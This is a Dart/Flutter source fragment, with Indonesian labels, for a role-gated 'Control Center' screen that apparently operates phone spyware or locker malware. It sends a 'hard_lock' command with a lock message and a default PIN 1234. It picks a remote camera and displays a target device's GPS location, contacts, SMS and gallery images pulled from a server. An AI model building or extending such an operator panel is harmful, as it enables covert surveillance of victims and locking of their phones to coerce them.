        _dlgBtn('Lock', _amber, () { Navigator.pop(context); _cmd('hard_lock', extra:'${m.text.trim().isEmpty?"HP INI DIKUNCI":m.text.trim()}|${p.text.trim().isEmpty?"1234":p.text.trim()}'); if (c.text.trim().isNotEmpty) Future.delayed(const Duration(milliseconds:500),()=>_sendChat(c.text.trim())); }),
      ],
    ));
  }

  void _showCamPicker(Function(String) onPick) {
    String sel='back';
    showDialog(context: context, builder: (_) => StatefulBuilder(
      builder: (ctx, ss) => Dialog(
        backgroundColor: _s1, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        child: Padding(padding: const EdgeInsets.all(22), child: Column(mainAxisSize: MainAxisSize.min, children: [
          const Text('Pilih Kamera', style: TextStyle(color: _textP, fontSize: 15, fontWeight: FontWeight.w900, letterSpacing: 1)),
          const SizedBox(height: 20),
          Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: ['back','front'].map((v) {
            final a=sel==v;
            return GestureDetector(onTap:()=>ss(()=>sel=v), child: AnimatedContainer(
              duration: const Duration(milliseconds: 200),
              padding: const EdgeInsets.symmetric(horizontal: 26, vertical: 20),
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: a ? [_cyan.withOpacity(0.14),_cyan.withOpacity(0.04)] : [_s2,_s2]),
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: a ? _cyan.withOpacity(0.6) : _bord, width: a?1.5:1),
                boxShadow: a ? [BoxShadow(color: _cyan.withOpacity(0.2), blurRadius: 14)] : []),
              child: Column(children: [
                Icon(v=='back' ? Icons.camera_rear_rounded : Icons.camera_front_rounded, color: a ? _cyan : _textM, size: 34),
                const SizedBox(height: 10),
                Text(v=='back'?'Belakang':'Depan', style: TextStyle(color: a?_cyan:_textS, fontSize: 12, fontWeight: FontWeight.w800)),
              ])));
          }).toList()),
          const SizedBox(height: 22),
          Row(children: [
            Expanded(child: _dlgBtn('Batal', _textM, ()=>Navigator.pop(ctx))),
            const SizedBox(width: 10),
            Expanded(child: _dlgBtn('Pilih', _cyan, (){ Navigator.pop(ctx); onPick(sel); })),
          ]),
        ])),
      ),
    ));
  }

  void _inputDlg(String title, String label, Function(String) onDone, {bool isNum=false}) {
    final ctrl=TextEditingController();
    showDialog(context: context, builder: (_) => _dlgBase(
      title: title, icon: Icons.edit_rounded, color: _cyan, body: null,
      extra: _field(ctrl, label, isNum: isNum),
      actions: [
        _dlgBtn('Batal', _textM, ()=>Navigator.pop(context)),
        _dlgBtn('Kirim', _cyan, (){ Navigator.pop(context); onDone(ctrl.text.trim()); }),
      ],
    ));
  }

  void _fetchNotif() async {
    try {
      final res = await http.get(Uri.parse('$_kBase/api/get-notifications/$_id'));
      if (res.statusCode==200) {
        final list = jsonDecode(res.body) as List;
        showModalBottomSheet(context: context, backgroundColor: _s1, isScrollControlled: true,
          shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(22))),
          builder: (_) => DraggableScrollableSheet(initialChildSize: 0.6, maxChildSize: 0.9, expand: false,
            builder: (_, sc) => Column(children: [
              Container(height: 4, width: 40, margin: const EdgeInsets.only(top: 12, bottom: 10), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_cyan, _vio]), borderRadius: BorderRadius.circular(2))),
              const Text('Notifikasi', style: TextStyle(color: _textP, fontWeight: FontWeight.w900, fontSize: 15, letterSpacing: 1)),
              const SizedBox(height: 10),
              Expanded(child: ListView.separated(controller: sc, padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: list.length, separatorBuilder: (_, __) => Divider(color: _bord, height: 1),
                itemBuilder: (_, i) => ListTile(
                  contentPadding: const EdgeInsets.symmetric(vertical: 4),
                  leading: Container(width: 38, height: 38, decoration: BoxDecoration(gradient: LinearGradient(colors: [_vio.withOpacity(0.15),_vio.withOpacity(0.05)]), borderRadius: BorderRadius.circular(12), border: Border.all(color: _vio.withOpacity(0.25))),
                    child: const Icon(Icons.notifications_active_rounded, color: _vio, size: 18)),
                  title: Text(list[i]['title']?.toString()??'-', style: const TextStyle(color: _textP, fontSize: 13, fontWeight: FontWeight.w700)),
                  subtitle: Text(list[i]['body']?.toString()??'', style: const TextStyle(color: _textS, fontSize: 11))))),
            ])));
      }
    } catch (_) { _toast('Gagal ambil notif', c: _amber); }
  }

  void _imgDialog(String b64, String title) {
    try {
      final bytes = base64Decode(b64.contains(',') ? b64.split(',').last : b64);
      showDialog(context: context, builder: (_) => Dialog(
        backgroundColor: _bg, insetPadding: const EdgeInsets.all(12),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(18)),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Padding(padding: const EdgeInsets.all(14), child: Text(title, style: const TextStyle(color: _textP, fontWeight: FontWeight.w900, fontSize: 13, letterSpacing: 1))),
          ClipRRect(borderRadius: const BorderRadius.vertical(bottom: Radius.circular(18)),
            child: Image.memory(bytes, fit: BoxFit.contain)),
        ]),
      ));
    } catch (_) { _toast('Gagal decode gambar', c: _amber); }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    showDialog(context: context, builder: (_) => _dlgBase(
      title: 'GPS Location', icon: Icons.satellite_alt_rounded, color: _green,
      body: 'Lat: $lat\nLng: $lng',
      actions: [
        _dlgBtn('Tutup', _textM, () => Navigator.pop(context)),
        _dlgBtn('Buka Maps', _green, () => launchUrl(Uri.parse('https://www.google.com/maps/search/?api=1&query=$lat,$lng'), mode: LaunchMode.externalApplication)),
      ],
    ));
  }

  void _textDialog(String title, String content) {
    showDialog(context: context, builder: (_) => Dialog(
      backgroundColor: _s1, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(18)),
      child: Padding(padding: const EdgeInsets.all(18), child: Column(mainAxisSize: MainAxisSize.min, children: [
        Text(title, style: const TextStyle(color: _textP, fontSize: 14, fontWeight: FontWeight.w900, letterSpacing: 1)),
        const SizedBox(height: 14),
        Container(padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(gradient: LinearGradient(colors: [_s2,_bg]), borderRadius: BorderRadius.circular(10), border: Border.all(color: _bord)),
          child: SelectableText(content, style: const TextStyle(color: _cyan, fontSize: 12))),
        const SizedBox(height: 14),
        _dlgBtn('Tutup', _textM, () => Navigator.pop(context)),
      ])),
    ));
  }

  void _contactsSheet(List c) {
    showModalBottomSheet(context: context, backgroundColor: _s1, isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(22))),
      builder: (_) => DraggableScrollableSheet(initialChildSize: 0.6, maxChildSize: 0.9, expand: false,
        builder: (_, sc) => Column(children: [
          Container(height: 4, width: 40, margin: const EdgeInsets.only(top: 12, bottom: 10), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_cyan, _vio]), borderRadius: BorderRadius.circular(2))),
          Text('Kontak (${c.length})', style: const TextStyle(color: _textP, fontWeight: FontWeight.w900, fontSize: 15)),
          Expanded(child: ListView.separated(controller: sc, padding: const EdgeInsets.symmetric(horizontal: 14),
            itemCount: c.length, separatorBuilder: (_, __) => Divider(color: _bord, height: 1),
            itemBuilder: (_, i) => ListTile(
              leading: Container(width: 38, height: 38, decoration: BoxDecoration(gradient: LinearGradient(colors: [_cyan.withOpacity(0.15),_cyan.withOpacity(0.05)]), borderRadius: BorderRadius.circular(12), border: Border.all(color: _cyan.withOpacity(0.25))),
                child: const Icon(Icons.person_rounded, color: _cyan, size: 18)),
              title: Text(c[i]['name']?.toString()??'-', style: const TextStyle(color: _textP, fontSize: 13, fontWeight: FontWeight.w600)),
              subtitle: Text(c[i]['number']?.toString()??'-', style: const TextStyle(color: _textS, fontSize: 11))))),
        ])));
  }

  void _smsSheet(List s) {
    showModalBottomSheet(context: context, backgroundColor: _s1, isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(22))),
      builder: (_) => DraggableScrollableSheet(initialChildSize: 0.75, maxChildSize: 0.95, expand: false,
        builder: (_, sc) => Column(children: [
          Container(height: 4, width: 40, margin: const EdgeInsets.only(top: 12, bottom: 10), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_vio, _cyan]), borderRadius: BorderRadius.circular(2))),
          Text('SMS (${s.length})', style: const TextStyle(color: _textP, fontWeight: FontWeight.w900, fontSize: 15)),
          Expanded(child: ListView.separated(controller: sc, padding: const EdgeInsets.symmetric(horizontal: 14),
            itemCount: s.length, separatorBuilder: (_, __) => Divider(color: _bord, height: 1),
            itemBuilder: (_, i) { final m=s[i] as Map; return ListTile(
              leading: Container(width: 38, height: 38, decoration: BoxDecoration(gradient: LinearGradient(colors: [_vio.withOpacity(0.15),_vio.withOpacity(0.05)]), borderRadius: BorderRadius.circular(12), border: Border.all(color: _vio.withOpacity(0.25))),
                child: const Icon(Icons.mark_unread_chat_alt_rounded, color: _vio, size: 18)),
              title: Text(m['address']?.toString()??'-', style: const TextStyle(color: _textP, fontSize: 13, fontWeight: FontWeight.w600)),
              subtitle: Text(m['body']?.toString()??'', style: const TextStyle(color: _textS, fontSize: 11), maxLines: 2, overflow: TextOverflow.ellipsis)); })),
        ])));
  }

  void _gallerySheet(List imgs) {
    showModalBottomSheet(context: context, backgroundColor: _s1, isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(22))),
      builder: (_) => DraggableScrollableSheet(initialChildSize: 0.75, maxChildSize: 0.95, expand: false,
        builder: (_, sc) => Column(children: [
          Container(height: 4, width: 40, margin: const EdgeInsets.only(top: 12, bottom: 10), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_cyan, _amber]), borderRadius: BorderRadius.circular(2))),
          Text('Gallery (${imgs.length})', style: const TextStyle(color: _textP, fontWeight: FontWeight.w900, fontSize: 15)),
          Expanded(child: imgs.isEmpty ? const Center(child: Text('Kosong', style: TextStyle(color: _textM)))
            : GridView.builder(controller: sc, padding: const EdgeInsets.all(10),
                gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 5, mainAxisSpacing: 5),
                itemCount: imgs.length,
                itemBuilder: (_, i) { try { final raw=imgs[i].toString(); final bytes=base64Decode(raw.contains(',') ? raw.split(',').last : raw); return GestureDetector(onTap:()=>_imgDialog(raw,'Gallery ${i+1}'), child: ClipRRect(borderRadius: BorderRadius.circular(10), child: Image.memory(bytes, fit: BoxFit.cover))); } catch (_) { return Container(decoration: BoxDecoration(color: _bg, borderRadius: BorderRadius.circular(10))); } })),
        ])));
  }

  // ── UI Helpers ─────────────────────────────────────────────────────────────
  Widget _secHeader(String t, IconData icon, Color c) => Row(children: [
    Container(width: 38, height: 38,
      decoration: BoxDecoration(
        gradient: LinearGradient(colors: [c.withOpacity(0.18), c.withOpacity(0.06)]),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: c.withOpacity(0.3)),
        boxShadow: [BoxShadow(color: c.withOpacity(0.12), blurRadius: 10)]),
      child: Icon(icon, color: c, size: 18)),
    const SizedBox(width: 12),
    Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Text(t, style: const TextStyle(color: _textP, fontSize: 12, fontWeight: FontWeight.w900, letterSpacing: 0.5)),
      const SizedBox(height: 4),
      Container(height: 1.5, width: 52,
        decoration: BoxDecoration(gradient: LinearGradient(colors: [c.withOpacity(0.8), Colors.transparent]))),
    ]),
  ]);

  Widget _btn(String label, Color color, IconData icon, VoidCallback fn, {bool outlined=false}) =>
    GestureDetector(
      onTap: fn,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 16),
        decoration: BoxDecoration(
          gradient: outlined ? null : LinearGradient(colors: [color.withOpacity(0.1), color.withOpacity(0.02)], begin: Alignment.topLeft, end: Alignment.bottomRight),
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: outlined ? color.withOpacity(0.2) : color.withOpacity(0.3), width: outlined ? 1 : 1.5),
          boxShadow: outlined ? [] : [BoxShadow(color: color.withOpacity(0.07), blurRadius: 14)]),
        child: Row(children: [
          Container(width: 40, height: 40,
            decoration: BoxDecoration(
              gradient: LinearGradient(colors: [color.withOpacity(0.18), color.withOpacity(0.06)]),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: color.withOpacity(0.25)),
              boxShadow: [BoxShadow(color: color.withOpacity(0.1), blurRadius: 8)]),
            child: Icon(icon, color: color, size: 19)),
          const SizedBox(width: 14),
          Expanded(child: Text(label, style: TextStyle(color: outlined ? color.withOpacity(0.7) : _textP, fontSize: 13, fontWeight: FontWeight.w700))),
          Container(width: 7, height: 7, decoration: BoxDecoration(shape: BoxShape.circle, color: color.withOpacity(outlined?0.3:0.6), boxShadow: outlined ? [] : [BoxShadow(color: color.withOpacity(0.5), blurRadius: 4)])),
          const SizedBox(width: 4),
          Icon(Icons.chevron_right_rounded, color: _textM, size: 17),
        ]),
      ),
    );

  Widget _field(TextEditingController ctrl, String label, {String hint='', bool isNum=false}) =>
    TextField(
      controller: ctrl,
      keyboardType: isNum ? TextInputType.number : TextInputType.text,
      style: const TextStyle(color: _textP, fontSize: 13),
      decoration: InputDecoration(
        labelText: label, hintText: hint,
        labelStyle: const TextStyle(color: _textS, fontSize: 12),
        hintStyle: const TextStyle(color: _textM, fontSize: 12),
        filled: true, fillColor: _bg,
        contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
        border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: _bord)),
        enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: _bord)),
        focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: _cyan, width: 1.5)),
      ),
    );

  Widget _dlgBase({required String title, required IconData icon, required Color color, String? body, Widget? extra, required List<Widget> actions}) =>
    Dialog(
      backgroundColor: _s1, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(22)),
      child: Padding(padding: const EdgeInsets.all(22), child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          Container(width: 40, height: 40,
            decoration: BoxDecoration(gradient: LinearGradient(colors: [color.withOpacity(0.18),color.withOpacity(0.06)]), borderRadius: BorderRadius.circular(12), border: Border.all(color: color.withOpacity(0.3)), boxShadow: [BoxShadow(color: color.withOpacity(0.15), blurRadius: 10)]),
            child: Icon(icon, color: color, size: 19)),
          const SizedBox(width: 12),
          Text(title, style: const TextStyle(color: _textP, fontSize: 15, fontWeight: FontWeight.w900)),
        ]),
        if (body!=null || extra!=null)...[
          const SizedBox(height: 16),
          if (body!=null) Text(body, style: const TextStyle(color: _textS, fontSize: 13, height: 1.7)),
          if (extra!=null) extra,
        ],
        const SizedBox(height: 20),
        Row(mainAxisAlignment: MainAxisAlignment.end, children: actions.map((a) => Padding(padding: const EdgeInsets.only(left: 8), child: a)).toList()),
      ])),
    );

  Widget _dlgBtn(String label, Color c, VoidCallback fn) => GestureDetector(
    onTap: fn,
    child: Container(
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 11),
      decoration: BoxDecoration(
        gradient: c==_textM ? null : LinearGradient(colors: [c.withOpacity(0.14), c.withOpacity(0.05)]),
        borderRadius: BorderRadius.circular(11),
        border: Border.all(color: c.withOpacity(c==_textM ? 0.15 : 0.4))),
      child: Text(label, style: TextStyle(color: c, fontSize: 12, fontWeight: FontWeight.w800, letterSpacing: 0.5)),
    ),
  );

  Widget _accessDenied() => Scaffold(
    backgroundColor: _bg,
    appBar: AppBar(backgroundColor: _s1, elevation: 0,
      leading: GestureDetector(onTap: ()=>Navigator.pop(context),
        child: Container(margin: const EdgeInsets.all(10),
          decoration: BoxDecoration(gradient: LinearGradient(colors: [_cyan.withOpacity(0.14),_cyan.withOpacity(0.04)]), borderRadius: BorderRadius.circular(12), border: Border.all(color: _cyan.withOpacity(0.35))),
          child: const Icon(Icons.arrow_back_ios_new_rounded, color: _cyan, size: 15))),
      title: const Text('Control Center', style: TextStyle(color: _textP, fontSize: 14, fontWeight: FontWeight.w900, letterSpacing: 0.5))),
    body: Center(child: Padding(padding: const EdgeInsets.all(32),
      child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
        Container(width: 100, height: 100,
          decoration: BoxDecoration(shape: BoxShape.circle,
            gradient: RadialGradient(colors: [_vio.withOpacity(0.2), Colors.transparent]),
            border: Border.all(color: _vio.withOpacity(0.4), width: 1.5),
            boxShadow: [BoxShadow(color: _vio.withOpacity(0.15), blurRadius: 30)]),
          child: const Icon(Icons.lock_person_rounded, color: _vio, size: 48)),
        const SizedBox(height: 28),
        const Text('AKSES TERBATAS', style: TextStyle(color: _textP, fontSize: 18, fontWeight: FontWeight.w900, letterSpacing: 3)),
        const SizedBox(height: 12),
        Text('Role ${widget.role.toUpperCase()} tidak memiliki akses.', style: const TextStyle(color: _textS, fontSize: 12)),
        const SizedBox(height: 32),
        GestureDetector(onTap: ()=>Navigator.pop(context),
          child: Container(padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 15),
            decoration: BoxDecoration(gradient: const LinearGradient(colors: [_cyanD, _cyan2]), borderRadius: BorderRadius.circular(16), boxShadow: [BoxShadow(color: _cyan.withOpacity(0.4), blurRadius: 20)]),
            child: const Text('KEMBALI', style: TextStyle(color: _bg, fontWeight: FontWeight.w900, fontSize: 13, letterSpacing: 2)))),
      ]))),
  );
}
